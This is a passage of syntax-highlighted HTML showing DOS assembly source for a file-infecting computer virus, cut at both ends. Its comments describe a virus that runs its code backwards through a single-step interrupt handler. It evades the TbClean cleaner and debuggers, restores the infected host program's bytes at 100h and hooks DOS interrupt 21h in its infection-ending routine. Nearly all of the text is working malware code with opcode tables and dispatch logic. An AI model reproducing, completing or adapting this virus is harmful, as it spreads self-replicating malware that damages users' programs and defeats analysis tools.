                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">

                        </span><span class="sc1">; Installation check</span><span class="sc0">

</span><span class="sc5">end_or_init</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; The 'nop' is the signal for the</span><span class="sc0">
                                        </span><span class="sc1">;virus to start executing backwards</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">                     </span><span class="sc1">; We don't want TbClean here, do we ?</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Restore bytes and return to host:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; there's a debugger out</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; there... whoooo, I'm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc1">; afraid ! :)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">102h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">push_em_all</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cli</span><span class="sc0">                               </span><span class="sc1">; We save registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">return</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">return</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pop_em_all</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cli</span><span class="sc0">                              </span><span class="sc1">; We recover registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">return</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">return</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">back_zone</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; Backwards executor zone ( where int 1h is attached )</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_em_all</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                    </span><span class="sc1">; We got on DS:DI now the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20d</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;CS:IP has sent to the stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">22d</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">24d</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Pushed flags register</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">; Nop will tell us when does the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">continua</span><span class="sc0">        </span><span class="sc1">;executing start; installing_on is</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">installing_on</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;a flag that tells</span><span class="sc0">
                                                       </span><span class="sc1">;we have to backtrace</span><span class="sc0">

</span><span class="sc5">continua</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">installing_on</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@adelante</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">vamonos</span><span class="sc0">
</span><span class="sc5">@adelante</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">; In AL we've got the first byte of the instruction we've</span><span class="sc0">
                </span><span class="sc1">;just executed, but we cannot do nothin with this. First,</span><span class="sc0">
                </span><span class="sc1">;we'll decrement ds:si, and sub si the last instruction</span><span class="sc0">
                </span><span class="sc1">;size and which at the start lasts one byte ( the nop ),</span><span class="sc0">
                </span><span class="sc1">;so we'll be at the first opcode of the backwards stored</span><span class="sc0">
                </span><span class="sc1">;instructions we're going to execute.</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">instanterior</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; So, DS:SI now points to the opcode</span><span class="sc0">
                                        </span><span class="sc1">;that will be the start of the next</span><span class="sc0">
                                        </span><span class="sc1">;backwards instruction</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; We load that opcode in Al, and</span><span class="sc0">
                                        </span><span class="sc1">;check it with the table to verify</span><span class="sc0">
                                        </span><span class="sc1">;it's lenght: only the opcodes used</span><span class="sc0">
                                        </span><span class="sc1">;by the virus are checked.</span><span class="sc0">
</span><span class="sc5">@dsescsss</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">


                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">     </span><span class="sc1">; Table</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">inittable1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">57d</span><span class="sc0">
</span><span class="sc5">@buscaopcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; Searches opcode in table</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@encontrado</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@buscaopcode</span><span class="sc0">

</span><span class="sc5">@encontrado</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Searches where to jump</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">inittable2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">114d</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc5">inittable1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">0a5h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">049h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05ah</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc4">,</span><span class="sc2">03ch</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc2">0a3h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">inittable2</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@prefijo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jjz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@finished_go</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jmp2aplace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@makeint</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes5</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jjnz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jjb</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end_infect</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes4</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jjnb</span><span class="sc0">

</span><span class="sc5">@prefijo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@dsescsss</span><span class="sc0">

</span><span class="sc5">@makeint</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes1</span><span class="sc0">

</span><span class="sc5">@finished_go</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int1h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int1h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">25d</span><span class="sc4">],</span><span class="sc2">0feh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20d</span><span class="sc4">],</span><span class="sc2">0100h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_em_all</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">@end_infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int1h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int1h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">25d</span><span class="sc4">],</span><span class="sc2">0feh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20d</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@realend</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_em_all</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">@@realend</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_em_all</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">bp_site</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int21jump</span><span class="sc0">

</span><span class="sc5">@jjnb</span><span class="sc4">:</span><span class="sc0">
